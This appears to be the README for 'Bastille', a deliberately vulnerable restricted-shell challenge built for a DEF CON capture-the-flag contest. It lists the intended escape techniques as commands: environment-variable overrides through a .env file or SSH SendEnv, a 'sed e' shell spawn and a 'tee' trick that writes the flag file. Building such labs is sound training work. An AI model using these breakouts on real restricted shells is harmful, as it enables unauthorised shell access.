# Bastille

Go directly to jail, do not pass go, do not collect $200!



Bastille is a retro style shell escape vulnerability. The user is dropped into a restricted shell and must escape to get access to features that they wouldnt normally have.
For DEF CON, Bastille is run behind an SSH server with a known password. The competitors must SSH onto the server and then escape the shell to plant the flag.


## Running
To run the server in the competition environment, use the following docker-compose file
```yaml
version: '3'
services:
  bastile:
    build: .
    user: user
    restart: always
```

## Escape Techniques

1. Env override: If a binary is set in an environment variable, then it can be executed
    1. Set Env with `.env` file. Respawn the shell and then execute the variable
    ```
    [bastille] cwd > tee .env
    VAR=/bin/bash
    [bastille] cwd > $SHELL
    [bastille] cwd > $VAR
    ```

    2. Set the env with SSH
    ```
    LANG=/bin/bash ssh -o SendEnv=LANG user@target
    [bastille] cwd > $VAR
    ```

2. GTFO Bins with sed/awk
  ```
  [bastille] cwd > sed e
  ```

3. Write to the flag without escaping
  ```
  [bastille] cwd > tee a a a a a a a a a a a a a a a a a a a a /flags/flag.txt
  <YOUR FLAG HERE> 
  ```